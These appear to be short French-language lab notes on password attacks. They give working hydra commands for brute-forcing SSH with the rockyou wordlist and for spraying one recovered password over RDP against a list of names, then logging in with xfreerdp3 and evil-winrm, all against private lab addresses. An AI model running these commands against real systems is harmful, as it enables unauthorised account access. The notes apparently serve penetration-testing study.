```bash
## SSH

hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201

le -s pour spécifier le port
```
```bash
## Password Spraying
On trouve le mdp SuperS3cure1337#

Pour RDP on test le mdp sur plein de users si on veut ajouter un nom comme daniel et justin on peut ajouter les noms à la liste:

echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt

hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
```bash

xfreerdp3 /u:daniel /p:SuperS3cure1337# /v:192.168.62.202

evil-winrm -i 192.168.62.202 -u daniel -p SuperS3cure1337#   
```
